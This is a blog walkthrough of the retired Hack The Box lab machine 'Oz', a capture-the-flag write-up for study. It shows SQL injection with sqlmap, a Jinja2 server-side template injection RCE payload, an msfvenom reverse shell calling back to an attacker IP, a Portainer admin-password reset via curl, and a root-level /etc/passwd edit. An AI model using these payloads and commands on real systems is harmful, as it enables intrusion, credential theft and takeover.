@@ -1,0 +1,333 @@
+
+
+There is no place like home.
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+12 Jan 2019
+
+
+
+10 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Oz, a retired vulnerable VM created by incidrthreat and Mumbai, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+Oz is a retired vulnerable VM from Hack The Box.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.96
+...
+PORT     STATE SERVICE REASON         VERSION
+80/tcp   open  http    syn-ack ttl 62 Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-favicon: Unknown favicon MD5: AC490FD5D3697E544EA29DD28A573ED4
+| http-methods:
+|_  Supported Methods: HEAD OPTIONS GET POST
+|_http-title: OZ webapi
+|_http-trane-info: Problem with XML parsing of /evox/about
+8080/tcp open  http    syn-ack ttl 62 Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-favicon: Unknown favicon MD5: 131B03077D7717DBFF2E41E52F08BC7A
+| http-methods:
+|_  Supported Methods: HEAD GET POST OPTIONS
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+| http-title: GBR Support - Login
+|_Requested resource was http://10.10.10.96:8080/login
+|_http-trane-info: Problem with XML parsing of /evox/about
+
+nmap finds two open ports: 80/tcp and 8080/tcp. Both of them originate from Python. This is how they look like.
+
+
+
+
+
+
+Directory / File Enumeration
+Letâs use wfuzz to check out whatâs next.
+# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.96/FUZZ
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.96/FUZZ
+Total requests: 950
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=200      0 L        4 W           27 Ch        "e"
+000002:  C=200      0 L        1 W           68 Ch        "00"
+000004:  C=200      0 L        4 W           27 Ch        "02"
+000003:  C=200      0 L        4 W           27 Ch        "01"
+000006:  C=200      0 L        4 W           27 Ch        "1"
+000007:  C=200      0 L        4 W           27 Ch        "10"
+000008:  C=200      0 L        4 W           27 Ch        "100"
+000005:  C=200      0 L        1 W          144 Ch        "03"
+000009:  C=200      0 L        1 W          115 Ch        "1000"
+000010:  C=200      0 L        4 W           27 Ch        "123"
+000011:  C=200      0 L        1 W          156 Ch        "2"
+000012:  C=200      0 L        1 W           59 Ch        "20"
+000013:  C=200      0 L        1 W           81 Ch        "200"
+000014:  C=200      0 L        4 W           27 Ch        "2000"
+000015:  C=200      0 L        1 W          229 Ch        "2001"
+000016:  C=200      0 L        1 W          177 Ch        "2002"
+
+Hold up. Somethingâs not right. Every request results in a 200?
+
+
+
+Just like above, the response is either one line with âPlease register a username!â or a random string with mixed digits and uppercase letters.
+Well, this is easy to fix with wfuzzâs filtering syntax.
+# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hl 0 http://10.10.10.96/FUZZ
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.96/FUZZ
+Total requests: 950
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000871:  C=200      3 L        6 W           79 Ch        "users"
+
+Total time: 38.43956
+Processed Requests: 950
+Filtered Requests: 949
+Requests/sec.: 24.71412
+
+Awesome.
+
+
+
+Wait a tick. This is the same as requesting /, except for the Content-Length. Whatâs going on here?
+
+
+
+If I had to guess, I would say that /users is part of a RESTful Web API endpoint.
+Logically speaking, I should get something else if I append a username to /users like so.
+
+
+
+Indeed. Now look at what happens when I inject common SQL injections to /users passing through Burp.
+# wfuzz -w /usr/share/wfuzz/wordlist/Injections/SQL.txt -p 127.0.0.1:8080 http://10.10.10.96/users/FUZZ
+
+Thereâs a mix of 200s and 500s responses. Among the 200âs responses, thereâs also a mix of text and JSONâs.
+
+
+
+I see whatâs going on here. Basically thereâs an injection point at /users.
+SQL Injection
+Enter sqlmap. The popular open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+# sqlmap --url=http://10.10.10.96/users/*
+
+
+
+
+Perfect. We can now proceed to dump the database!
+# sqlmap --dump --url=http://10.10.10.96/users/*
+
+There are two tables in the database ozdb: users_gbw and tickets_gbw.
+
+
+
+
+
+
+Something stood out and caught my eye with the tickets. Port-knocking??!! From the look of it, the ticket number seems like a good choice of the ports to knock. But, whatâs the sequence? It canât be the factorial of 12, right? 12! has 479,001,600 tuples of 12 numbers. When will it end?
+Line 1 and line 8 of the tickets also caught my eye. Thereâs something interesting about Dorthiâs SSH key in the database.
+The best thing about sqlmap is that it allows one to open a shell that accepts SQL queries with the --sql-shell option.
+# sqlmap --sql-shell --url=http://10.10.10.96/users/*
+
+
+
+
+According to the hints, we should be able to read Dorthiâs RSA key pair at /home/dorthi/.ssh/.
+Private Key
+
+
+
+Public Key
+
+
+
+Letâs restore the key pair with xxd. The RSA private key is protected with a password as shown here.
+
+
+
+Whatâs next?
+John the Ripper
+According to the tickets, the GBR Support application is sharing the database. As such, we still have the password hashes of the users in users_gbw to crack. We can use John the Ripper for the job.
+One of the password hashes was cracked relatively quick. In this case, we donât need all the passwords; one is sufficient.
+
+
+
+Server-Side Template Injection
+Armed with the password of wizard.oz, we can now log in to GBR Support.
+
+
+
+Recall in the nmap scan, both 80/tcp and 8080/tcp originates from Python? Iâm guessing they were developed with Flask, a popular web microframework written in Python. The real giveaway was the use of the Werkzeug server. Using Flask entails the use of templates and Flask uses Jinja2, a template engine written in Python too.
+Several template engines are susceptible to Server-Side Template Injection (SSTI) vulnerabilities and Jinja2 is no exception.
+Now that I have access to GBR Support, notice that it allows the creation of new tickets. Perhaps I can inject one of the fields?
+
+
+
+I found a GitHub repository with a Jinja2 RCE payload like so.
+
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+{{ config['RUNCMD']('&lt;shell command&gt;',shell=True) }}
+
+
+Letâs give it a shot.
+
+
+
+
+
+
+Awesome. It works! Armed with this insight, letâs generate a reverse shell with msfvenom like so.
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.13.52 LPORT=1234 -f elf -o rev
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: rev
+
+Next, we host the reverse shell with Pythonâs SimpleHTTPServer module. Letâs run a wget command with the RCE payload.
+
+
+
+See if we can transfer it over.
+
+
+
+Great. Now, we just need to use the RCE payload to make our reverse shell executable and then launch it.
+
+
+
+We have shell and root no less!
+
+
+
+The excitement is short-lived. Thatâs because Iâm still in a container and quoting one of the lines, âYou are just wasting time nowâ¦ someone else is getting user.txtâ 
+All is not lost. Well, at least I manage to find out Dorthiâs password for the private key.
+
+
+
+And the port-knocking sequence.
+
+
+
+Knocking on Heavenâs Door
+Now that we know the port-knocking sequence, letâs write a script with nmap as the main driver. Bear in mind the port sequences are in UDP only. Thatâs why nmap is ran with -sU.
+knock.sh
+#!/bin/bash
+
+TARGET=$1
+
+for ports in $(cat permutation.txt); do
+    echo "[*] Trying sequence $ports..."
+    for p in $(echo $ports | tr ',' ' '); do
+        nmap -n -v0 -Pn --max-retries 0 -p $p -sU $TARGET
+    done
+    sleep 1
+    nmap -n -v -Pn -p22 -T5 $TARGET -oN ${ports}.txt
+    ssh -i ../id_rsa [email protected]$TARGET
+done
+
+permutation.txt contains the sequence 40809,50212,46969.
+True enough, the SSH service is now unlocked. But, because the sequence is valid for 15 seconds, we need to act fast.
+
+
+
+The user.txt is located at dorthiâs home directory.
+
+
+
+Privilege Escalation
+During enumeration of dorthiâs account, I noticed that dorthi is allowed to run the following commands as root without password.
+
+
+
+The idea behind these commands is so that dorthi can find out which IP address the Portainer container is on.
+
+
+
+Now, thereâs something very wrong with Portainer 1.11.1; you can reset the admin password to your liking.
+And, since curl is available, letâs use it to change the admin password like so.
+$ curl -i -H "Content-Type: application/json" -d '{"username":"admin","password":"noplacelikehome"}' 172.17.0.2:9000/api/users/admin/init
+
+Next, letâs forward the port to my attacking machine so that I can use my browser to access the Portainer web user interface. But first, I need to enable SSH on my machine.
+On my machine
+# systemctl start ssh
+
+On the remote shell
+$ ssh -R 10.10.13.52:9999:172.17.0.2:9000 [email protected] -fN
+
+This is how Portainer looks like.
+
+
+
+Oh! The sweet taste of admin access.
+
+
+
+We know that Portainer is running as root. And the creators are so kind to leave image python:2.7-alpine for us to create our own container.
+
+
+
+Letâs create a container with the image and mount /etc/password as /opt/passwd. Weâll add an account with the same UID as root.
+Give ourselves a TTY console
+
+
+
+Map /etc/passwd on the host to /opt/passwd on the container
+
+
+
+Start the container in privileged mode
+
+
+
+Once the container starts, go to the console and edit /opt/passwd with vi.
+
+
+
+to5bce5sr7eK6 is the crypt hash of âtoorâ with salt âtoorâ.
+# perl -e 'print crypt("toor", "toor")'
+
+Once thatâs done, we can su to root in the low-privileged shell obtained earlier.
+
+
+
+
+
